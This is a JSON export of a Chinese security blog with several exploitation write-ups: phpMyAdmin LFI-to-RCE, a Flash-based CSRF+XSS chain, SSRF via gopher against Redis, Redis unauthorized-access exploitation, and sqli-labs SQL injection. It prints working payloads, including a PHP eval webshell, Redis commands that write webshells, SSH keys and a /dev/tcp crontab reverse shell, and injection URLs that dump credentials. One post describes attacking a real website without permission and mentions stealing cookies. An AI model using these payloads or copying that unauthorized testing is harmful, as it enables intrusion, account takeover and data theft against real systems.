{"meta":{"title":"Damit5's Blog","subtitle":null,"description":"纸上得来终觉浅，绝知此事要躬行。","author":"Damit 5","url":"https://damit5.com"},"pages":[],"posts":[{"title":"phpMyAdmin 4.8.1 LFI to RCE（CVE-2018-12613）","slug":"phpMyAdmin-4-8-1-LFI-to-RCE（CVE-2018-12613）","date":"2018-06-25T10:05:25.000Z","updated":"2018-06-25T10:36:39.730Z","comments":true,"path":"2018/06/25/phpMyAdmin-4-8-1-LFI-to-RCE（CVE-2018-12613）/","link":"","permalink":"https://damit5.com/2018/06/25/phpMyAdmin-4-8-1-LFI-to-RCE（CVE-2018-12613）/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer0\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 前言phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。","text":"new APlayer({ element: document.getElementById(\"aplayer0\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 前言phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。 漏洞分析 可见第 61 行出现 include $_REQUEST[&#39;target&#39;];，这是文件包含的前兆，只需要满足 55 - 59 行的条件即可 第57行限制 target 参数不能以index开头 第58行限制 target 参数不能出现在 $target_blacklist 内 找到 $target_blacklist 的定义 123$target_blacklist = array ( &apos;import.php&apos;, &apos;export.php&apos;); 只要 target 参数不是 import.php 或 export.php 就行 第59行 Core::checkPageValidity($_REQUEST[&#39;target&#39;]) 找到Core类的checkPageValidity方法 文件路径 phpMyAdmin4.8.1\\libraries\\classes 可见 465 行，有一个 urldecode() 函数 把 ? 两次url编码为 %253f 即可绕过验证 环境搭建 phpstudy php 5.5.38+Apache phpMyAdmin 4.8.1 本地文件包含（LFI）payload 1http://127.0.0.1/phpMyAdmin4.8.1/index.php?target=db_sql.php%253f/../../index.html 这里的 db_sql.php 我们只需要满足在 $goto_whitelist 就行了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public static $goto_whitelist = array( &apos;db_datadict.php&apos;, &apos;db_sql.php&apos;, &apos;db_events.php&apos;, &apos;db_export.php&apos;, &apos;db_importdocsql.php&apos;, &apos;db_multi_table_query.php&apos;, &apos;db_structure.php&apos;, &apos;db_import.php&apos;, &apos;db_operations.php&apos;, &apos;db_search.php&apos;, &apos;db_routines.php&apos;, &apos;export.php&apos;, &apos;import.php&apos;, &apos;index.php&apos;, &apos;pdf_pages.php&apos;, &apos;pdf_schema.php&apos;, &apos;server_binlog.php&apos;, &apos;server_collations.php&apos;, &apos;server_databases.php&apos;, &apos;server_engines.php&apos;, &apos;server_export.php&apos;, &apos;server_import.php&apos;, &apos;server_privileges.php&apos;, &apos;server_sql.php&apos;, &apos;server_status.php&apos;, &apos;server_status_advisor.php&apos;, &apos;server_status_monitor.php&apos;, &apos;server_status_queries.php&apos;, &apos;server_status_variables.php&apos;, &apos;server_variables.php&apos;, &apos;sql.php&apos;, &apos;tbl_addfield.php&apos;, &apos;tbl_change.php&apos;, &apos;tbl_create.php&apos;, &apos;tbl_import.php&apos;, &apos;tbl_indexes.php&apos;, &apos;tbl_sql.php&apos;, &apos;tbl_export.php&apos;, &apos;tbl_operations.php&apos;, &apos;tbl_structure.php&apos;, &apos;tbl_relation.php&apos;, &apos;tbl_replace.php&apos;, &apos;tbl_row_action.php&apos;, &apos;tbl_select.php&apos;, &apos;tbl_zoom_select.php&apos;, &apos;transformation_overview.php&apos;, &apos;transformation_wrapper.php&apos;, &apos;user_password.php&apos;, ); LFI to RCE利用mysql的data文件 修改或新建一个字段，名字修改为 WebShell 的内容 保存 找到对应的数据库文件查看 包含它 payload 1http://127.0.0.1/phpMyAdmin4.8.1/index.php?target=db_sql.php%253f/../../../MySQL/data/test/test.frm 参考文章查MD5官方文章 https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd 【CVE-2018-12613】phpMyAdmin 4.8.1 LFI to RCE http://www.lz1y.cn/archives/1457.html","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://damit5.com/tags/渗透测试/"}]},{"title":"一次XSS和CSRF的组合拳进攻 (CSRF+JSON)","slug":"一次XSS和CSRF的组合拳进攻-(CSRF+JSON)","date":"2018-06-02T07:19:18.000Z","updated":"2018-06-10T04:00:42.014Z","comments":true,"path":"2018/06/02/一次XSS和CSRF的组合拳进攻-(CSRF+JSON)/","link":"","permalink":"https://damit5.com/2018/06/02/一次XSS和CSRF的组合拳进攻-(CSRF+JSON)/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer16\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0x00 起因和一个高中同学聊天，无意间聊到了某个图片网","text":"new APlayer({ element: document.getElementById(\"aplayer16\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0x00 起因和一个高中同学聊天，无意间聊到了某个图片网 什么？25一张？这么贵？ 本着乐于助人的精神，进网站看了看，鼠标右键确实被禁止了，不能保存图片 但是审查元素后，可以清楚的看到图片的链接，而且还是高清无水印，emmmmmm这网站做得也是没谁了 解决了高中同学的问题后，想着下午又挺无聊的，于是就拿这个网站做了一下小小的测试（好吧，其实是我不想复习，复习真的好无聊 o(╥﹏╥)o） 便有了后面的内容 PS： 前面信息收集什么的就不多说了，和本文内容也没多大关系，就直接讲重点吧 因为自己浏览器的问题，验证码加载不出来，所以后面都是用同学的账号做的测试，高强度打码 0x01 发现存储型XSS漏洞大概逛了一下网站，最后进入了信息设置面板 看着这么多的框，总感觉存在XSS，审查元素后发现 简介 是用&lt;textarea&gt;这个标签来闭合的，于是构造 payload &lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;textarea&gt; 保存刷新后，成功弹出 xss 至此存储型XSS验证成功 0x02 分界线因为这个页面只有自己能看见，所以也就自己能触发（别人看资料的时候&lt;&gt;会被转义，也就没用了） 感觉这个洞很鸡肋，这个时候又想到了CSRF，如果每个人都自动将简介改成精心生成的恶意代码，那么这样每个人想再次修改自己的资料的时候，就可以触发 存储型XSS，我们也就可以盗取cookie、挂马或者其他一系列骚操作 0x03 CSRF 漏洞按照原来一样的操作 修改信息 –&gt; 保存时抓包 –&gt; 生成CSRF POC –&gt; 打开POC –&gt; 检验是否利用成功 但是这里遇到一个问题 以前post提交的数据都是形如 a=123&amp;b=456 这种，而这里提交的却是 json 格式的 于是这里就要利用到一些骚姿势 偷一张大佬们的图（这里因为需要验证content-type，目前搜到的就只有这种方法） 后面的大概攻击流程就是这样 生成 csrf.swf 文件 从Adobe官网安装Flex SDK用于将ActionScript编译为swf文件。Flex需要安装32位JVM，可以从Oracle官网下载安装32位的JDK。（这里只能用32位的，64位的不行） 创建一个名为csrf.as的文本文件，写入以下ActionScript代码。 将&lt;attacker-ip&gt;占位符替换为攻击者服务器的ip或者域名（307跳转页面的地址） 将此文件编译为csrf.swf，只需运行mxmlc csrf.as命令。这将创建一个名为csrf.swf的文件。 12345678910111213141516171819202122232425262728293031323334353637383940414243package&#123; import flash.display.Sprite; import flash.net.URLLoader; import flash.net.URLRequest; import flash.net.URLRequestHeader; import flash.net.URLRequestMethod;public class csrf extends Sprite &#123; public function csrf() &#123; super(); var member1:Object = null; var myJson:String = null; member1 = new Object(); member1 = &#123; &quot;gender&quot;:&quot;2&quot;, &quot;homeCity&quot;:&quot;4170&quot;, &quot;nowCity&quot;:&quot;4170&quot;, &quot;profession&quot;:&quot;23&quot;, &quot;description&quot;:&quot;&lt;/textarea&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;textarea&gt;&quot;, &quot;signature&quot;:&quot;&quot; &#125;; var myData:Object = member1; myJson = JSON.stringify(myData); myJson = JSON.stringify(myData); var url:String = &quot;http://&lt;attacker-ip&gt;/307.php&quot;; var request:URLRequest = new URLRequest(url); request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;)); request.data = myJson; request.method = URLRequestMethod.POST; var urlLoader:URLLoader = new URLLoader();try &#123; urlLoader.load(request); return; &#125; catch(e:Error) &#123; trace(e); return; &#125; &#125; &#125;&#125; 重定向php文件https://xxxx.cn/xxxx/xxxxx 为你要重定向的地址，即修改用户简介的地址，目标网站，不是攻击者的服务器 307.php 文件内容 1234&lt;?php // redirect automatically header(&quot;Location: https://xxxx.cn/xxxx/xxxxx&quot;, true, 307); ?&gt; 利用过程攻击者将 csrf.swf 和 307.php 文件放入同一目录 受害者在登陆存在CSRF漏洞的网站后，访问攻击者服务器上的swf文件 点击启动flash 可以在下面的网络选项中，看到307跳转成功，而且已经成功提交了POST数据 此时我们再刷新受害者个人消息页面，即可成功弹出 cookie 值 到此 CSRF+XSS 组合拳成功打出 0x04 总结 有框的地方就可能存在XSS 一定要细心，不仅仅在网站审查上要细心 CSRF + JSON 网上也有很多，不过都不是以实战来讲的 网上有些 CSRF + JSON 的利用有坑（这也是为什么我之前花了一整天都没成功） 0x05 参考在JSON端点上利用CSRF漏洞的实践教程 http://www.4hou.com/web/10234.html Exploiting JSON CSRF https://www.secpulse.com/archives/61297.html Exploiting JSON Cross Site Request Forgery (CSRF) using Flash https://www.geekboy.ninja/blog/tag/json-csrf/","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://damit5.com/tags/渗透测试/"}]},{"title":"SSRF 漏洞学习","slug":"SSRF-漏洞学习","date":"2018-05-26T08:31:58.000Z","updated":"2018-06-10T03:59:19.213Z","comments":true,"path":"2018/05/26/SSRF-漏洞学习/","link":"","permalink":"https://damit5.com/2018/05/26/SSRF-漏洞学习/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer8\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0x01 SSRF 概述SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器","text":"new APlayer({ element: document.getElementById(\"aplayer8\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0x01 SSRF 概述SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器 0x02 环境搭建环境内容 应用 版本 端口号 PhpStudy php5.4.45+Apache 80 Redis 3.0.501 6379 漏洞代码 ssrf.php此代码用来模拟SSRF，使用curl发起网络请求后返回客户端，请求加载文件 123456789&lt;?php$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]);#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch);curl_close($ch);?&gt; 上面的漏洞代码ssrf.php没有屏蔽回显，所以利用姿势比较多 0x03 漏洞利用gophergopher：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。 公网IP的VPS监听 2333 端口 1234[root@host ~]# nc -lvp 2333Ncat: Version 6.40 ( http://nmap.org/ncat )Ncat: Listening on :::2333Ncat: Listening on 0.0.0.0:2333 利用 gopher 协议访问 浏览器直接访问或者用 curl url http://127.0.0.1/ssrf.php?url=gopher://66.112.213.76:2333/_hello 收到回显1234567[root@host ~]# nc -lvp 2333Ncat: Version 6.40 ( http://nmap.org/ncat )Ncat: Listening on :::2333Ncat: Listening on 0.0.0.0:2333Ncat: Connection from 183.xxx.xxx.xxx.Ncat: Connection from 183.xxx.xxx.xxx:9661.hello dict因为此处 ssrf.php 的漏洞代码有回显，所以浏览器直接访问 http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:6379/info 或者终端 curl http://127.0.0.1/ssrf.php?url=dict://127.0.0.1:6379/info 可以获取Redis的配置信息 同理也可以添加或者查看Redis的信息 查看Redis存储的内容 file利用 file 协议可以读取任意内容 前提也是在有回显的情况下 http://127.0.0.1/ssrf.php?url=file:///c:\\Users\\h\\Desktop\\hello.txt http/s探测内网主机存活 0x04 攻击Redis写入webshell生成gopher协议的payload 端口转发 socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 Redis连接4444端口 redis-cli -p 4444 输入对应的payload 1234set shell &quot;&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;&quot;config set dir /var/www/html/ # 此时在linux服务器上测试config set dbfilename shell.phpsave 可以在socat界面看到数据包 大概长这样 1234567891011121314151617181920&gt; 2018/05/26 15:56:25.163014 length=63 from=17 to=79*3\\r$3\\rset\\r$5\\rshell\\r$32\\rx&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;\\r&lt; 2018/05/26 15:56:25.163312 length=5 from=10163 to=10167+OK\\r&gt; 2018/05/26 15:56:33.773190 length=55 from=80 to=134*4\\r$6\\rconfig\\r$3\\rset\\r$3\\rdir\\r$14\\r/var/www/html/\\r 利用脚本转换为gopher协议可以利用的payload 12345678910111213141516171819202122232425import sysexp = &apos;&apos;with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in &apos;&gt;&lt;+&apos;: continue # 判断倒数第2、3字符串是否为\\r elif line[-3:-1] == r&apos;\\r&apos;: # 如果该行只有\\r，将\\r替换成%0a%0d%0a if len(line) == 3: exp = exp + &apos;%0a%0d%0a&apos; else: line = line.replace(r&apos;\\r&apos;, &apos;%0d%0a&apos;) # 去掉最后的换行符 line = line.replace(&apos;\\n&apos;, &apos;&apos;) exp = exp + line # 判断是否是空行，空行替换为%0a elif line == &apos;\\x0a&apos;: exp = exp + &apos;%0a&apos; else: line = line.replace(&apos;\\n&apos;, &apos;&apos;) exp = exp + lineprint exp 测试脚本是否可用curl -v &#39;gopher://127.0.0.1:6379/_生成的exp PS我在复现的时候，不知道哪儿出了问题，一直报错 curl: (3) [globbing] illegal character in range specification at pos 87 0x05 可能存在漏洞的地方12345678910111213share wap url link src source target u 3g display sourceURl imageURL domain 0x06 修复方案 限制协议为HTTP、HTTPS 禁止30x跳转 设置URL白名单或者限制内网IP 0x07 参考文章SSRF in PHP https://joychou.org/web/phpssrf.html SSRF漏洞分析与利用 http://www.91ri.org/17111.html 利用 gopher 协议拓展攻击面 https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2 SSRF 详解 https://blog.csdn.net/qq_30135181/article/details/52734225 SSRF漏洞(原理&amp;绕过姿势) https://www.t00ls.net/articles-41070.html SSRF https://www.jianshu.com/p/ad7b8079e0d5","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://damit5.com/tags/渗透测试/"}]},{"title":"Redis未授权访问漏洞利用","slug":"Redis未授权访问漏洞利用","date":"2018-05-18T03:30:00.000Z","updated":"2018-06-10T03:58:59.146Z","comments":true,"path":"2018/05/18/Redis未授权访问漏洞利用/","link":"","permalink":"https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer6\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0x00 危害信息泄露 系统信息 redis保存的信息 GetShell 在Web目录中写入webshell 写入SSH公钥直接连接 写入计划任务(corntab)反弹shell","text":"new APlayer({ element: document.getElementById(\"aplayer6\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 0x00 危害信息泄露 系统信息 redis保存的信息 GetShell 在Web目录中写入webshell 写入SSH公钥直接连接 写入计划任务(corntab)反弹shell 0x01 环境 鸡型 ip 服务 版本 攻击鸡 192.168.1.100 Windows 10 攻击鸡 192.168.1.100 redis-cli 3.0.501 受害鸡 192.168.1.105 Ubuntu 16.04 LTS 受害鸡 192.168.1.105 redis-server 3.0.6 受害鸡 192.168.1.105 Apache 2.4.18 (Ubuntu) 因为新版的 redis 默认绑定的地址为 127.0.0.1，所以为了复现漏洞，我们将绑定端口改成0.0.0.0 sudo vim redis.conf 将 69 行的 127.0.0.1 修改为 0.0.0.0 启动redis必须使用 root 权限启动，否则save时会报错 1234# 关闭 redis 服务sudo service redis-server stop# 打开 redis 服务cd /usr/bin/ &amp;&amp; sudo redis-server 0x02 信息泄露数据泄露获取所有的key值 keys * 具体查看数据可以查看redis教程 http://www.runoob.com/redis/redis-tutorial.html 系统信息泄露info 命令 可以看到redis的版本、系统内核版本、配置文件路径等信息 0x03 GetShell在Web目录中写入webshell前提条件 已知网站目录的绝对路径，并且具有读写权限 环境搭建启动apache服务器 sudo service apache2 start 查看apache服务器状态 sudo service apache2 status 有一个 running 则说明在运行状态 getshell写入shell12345678# 写入一个string内容set shell &quot;&lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;&quot;# 设置备份目录config set dir /var/www/html/# 设置备份文件名config set dbfilename shell.php# 保存文件到本地save 菜刀连接 写入SSH公钥直接连接 本地生成公钥和私钥 将公钥写入到目标的.ssh文件夹 ssh 连接 在本地生成公钥和私钥PS : 这里为了方便，我直接从受害鸡里面生成的公钥和私钥，然后再将他们剪切到攻击鸡 ssh-keygen -t rsa 将公钥写入文件中123456789# 备份文件目录设置为对应的 .ssh，部分为 /root/.ssh/config set dir /home/lynn/.ssh/config set dbfilename authorized_keys# 保存key的时候加上两个`\\n`是为了避免和Redis里其他缓存数据混合set key &quot;\\n\\n\\生成的公钥n\\n&quot;save ssh 连接ssh -i id_rsa lynn@192.168.1.105 可以看到不需要输入密码直接连接 写入计划任务(corntab)反弹shell！注意！ 这里有一个很深的坑，那就是 crontab反弹debain,ubuntu都不行，因为他们对计划任务的格式很严格，必须要执行 crontab -u root /var/spool/cron/crontabs/root 通过语法检查后，才能执行计划任务。 因为这个坑，用了整整一天的时间来研究这个 参考文章 http://www.freebuf.com/vuls/148758.html 主要是感谢下方的评论 执行命令和写入公钥一样，将文件保存到本地，备份文件名必须要和用户的名字一样，比如是 lsa 那么备份文件就是 lsa 1234set shell &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.100/1234 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cron/crontabs/config set dbfilename rootsave 攻击鸡开启监听nc -lvp 1234 等待 1 分钟等待一分钟受害鸡即可执行任务，攻击鸡就可以收到shell 0x04 总结redis未授权访问总的来说危害还是挺大的 但是实际过程中还是会遇到很多很多的问题 比如 redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的 redis写入的时候就会覆盖passwd，而且passwd不能恢复 debian,ubuntu 计划任务的限制很严格，写入成功是不能执行的","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://damit5.com/tags/渗透测试/"}]},{"title":"通过 sqli-labs 学习SQL注入","slug":"通过-sqli-labs-学习SQL注入","date":"2018-05-11T14:24:36.000Z","updated":"2018-06-10T04:00:35.194Z","comments":true,"path":"2018/05/11/通过-sqli-labs-学习SQL注入/","link":"","permalink":"https://damit5.com/2018/05/11/通过-sqli-labs-学习SQL注入/","excerpt":"new APlayer({ element: document.getElementById(\"aplayer18\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 写在最前SQLI定义：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。","text":"new APlayer({ element: document.getElementById(\"aplayer18\"), narrow: false, autoplay: true, showlrc: 0, music: { title: \"六月的雨\", author: \"胡歌\", url: \"/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3\", pic: \"/Music/233.jpg\", } }); 写在最前SQLI定义：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 可能用到的函数解释ORDER BY ORDER BY 语句用于对结果集进行排序。 ORDER BY 语句默认按照升序对记录进行排序。 exists() 函数 存在的话返回结果为：1（true） 不存在的话返回结果：0（false） mid() 函数ord(mid()) mid(striing,start,length) string : (必需)规定要返回其中一部分的字符串。 start : (必需)规定开始位置（起始值是 1）。 length : (可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本。 substr() 函数ascii(substr())substr(string,num start,num length); string : 为字符串； start : 为起始位置 ( mysql中的start是从1开始的 ) length : 为长度。 left() 函数left(string,length) string : (必需)规定要返回其中一部分的字符串 length : (可选) 规定被返回字符串的前length长度的字符 limit 函数limit m,n 从 m 开始取 n 个 if() 函数在MySQL中，if（）函数语法如下： IF(expr1,expr2,expr3) 如果 expr1 为真，则 IF()函数执行expr2语句; 否则 IF()函数执行expr3语句。 sleep() 函数在mysql中，sleep()函数语法如下： sleep(seconds) 即sleep() 函数代码执行延迟若干秒。 我们在这里使用IF（查询语句，1，sleep（5）），即如果我们的查询语句为真，那么直接返回结果；如果我们的查询语句为假，那么过5秒之后返回页面。所以我们就根据返回页面的时间长短来判断我们的查询语句是否执行正确，即我们的出发点就回到了之前的基于布尔的SQL盲注，也就是构造查询语句来判断结果是否为真。 benchmark() 函数BENCHMARK(count,expr) 将表达式expr重复运行count次 在一定条件上能达到sleep()的效果 benchmark(10000000,null); length() 函数获得长度 123456mysql&gt; select length(123456);+----------------+| length(123456) |+----------------+| 6 |+----------------+ concat() 函数concat(str1,str2,...) 没有分隔符的连接字符串 concat_ws() 函数concat_ws(separator,str1,str2...) 含有分隔符的连接字符串 group_concat() 函数group_concat(str1,str2,...) 连接一个组的所有字符串，并以逗号分隔每一条数据 load_file() 函数load_file(file_name) 读取文件内容，可以将文件名转换成ASCII码或者十六进制的形式 ASCII码需要用char()函数,char(96,97) 十六进制前面要加上 0x 读取内容不显示的情况下，可以用hex()函数 hex(load_file()) insert() 函数向数据库中增加一行 insert [into] 表名 [(列名1, 列名2, 列名3, ...)] values (值1, 值2, 值3, ...); delete() 函数删除数据库的内容 delete from 表名称 where 删除条件; drop() 函数删除结构 drop database 数据库名 drop tables 表名 alter() 函数删除表中的列 alter table 表名 drop 列名称; update() 函数更新表中的数据 update 表名称 set 列名称=新值 where 更新条件; 环境搭建搭建需要环境 apache + php + mysql 下载 phpstudy 百度 phpstudy 下载 源码下载地址 https://github.com/Audi-1/sqli-labs 安装sql-libs 将下载的源码解压到 phpstudy 的 www 目录下 编辑下载源码中的 /sql-connections/db-creds.inc 文件 将数据库的username和password修改为你自己的mysql账号和密码（phpstudy中自带mysql环境用户名密码均为root） 访问 http://127.0.0.1/ 页面 点击 Setup/reset Database for labs 配置文件截图 搭建成功截图 tips： 为了方便学习查看，可以在源码中的$sql下一句语句写上以下php语句（可以看到数据库查询的完整语句是怎么样的）1echo &quot;你的 sql 语句是：&quot;.$sql.&quot;&lt;br&gt;&quot;; 开始闯关Less-1 (UNION 注入)判断是否存在注入先加 &#39; 试试 报错 那是因为我们之前的语句闭合了前面的&#39;，而后面单一个&#39;，所以会报错 于是修改我们的payload http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=1+--+ 没有报错，可以返回正常数据，说明我们后面的注释起到了作用，把LIMIT 0,1&#39;注释掉了 UNION 注入 判断列数order by 4 出错 order by 3 不出错，说明有3列 判断显位首先应该查询显位，以便后面显示数据 http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; union select 1,2,3+--+ 这里并没有显示出显位，所以我们再 id=1 中的 1 前面加上一个 -，让原来查询的数据不能显示出来，这样就可以让我们后面查询的1,2,3 可以显示出来 成功显示出显位数字，为 2 和 3，后续的查询结果都将在这2个地方显示 查询数据库名12345version() --- 看数据库的版本database() --- 查数据库名称user() --- 查当前数据库用户的权限@@version_compile_os --- 查看操作系统版本@@datadir --- 数据库路径 可以查询的内容有如上，查询数据库名，我们选择database() 修改 2 为 database() http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,database(),3+--+ 可以看出数据库名字为 security 查询表名http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27+--+ 也可以将最后的 &#39;security&#39; 换成十六进制 查询列名假设我们只对 user 表感兴趣 http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27+--+ 同理也可以将最后的 &#39;users&#39; 换成十六进制 查询字段假设这里我们只对 username 和 password 感兴趣 http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,username,password%20from%20users+--+ 但是这里只有一个内容，如果想要所有内容，可以采用 limit 的方法来依次读取 http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,username,password%20from%20users%20limit%200,1+--+ http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,username,password%20from%20users%20limit%201,1+--+ 或者用 group_concat() 函数来一次性输出所有内容 http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(username),group_concat(password)%20from%20users+--+ Less-2（UNION 注入）判断注入类型http://127.0.0.1/sqli-labs/Less-2/?id=1%27%20and%201=1%20+--+ 报错 http://127.0.0.1/sqli-labs/Less-2/?id=1%20and%201=1%20+--+ 不报错 说明这里接收的id参数类型为 int 型，也就是没有 &#39; 去闭合 判断列长order by 4 报错 http://127.0.0.1/sqli-labs/Less-2/?id=1%20order%20by%204+--+ order by 3 不报错 http://127.0.0.1/sqli-labs/Less-2/?id=1%20order%20by%203+--+ 其他步骤都和Less-1一样，就不写了 Less-3（UNION 注入）判断注入类型直接在末尾加 &#39;，发现报错信息 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1 有一个括号，所以尝试闭合一下括号 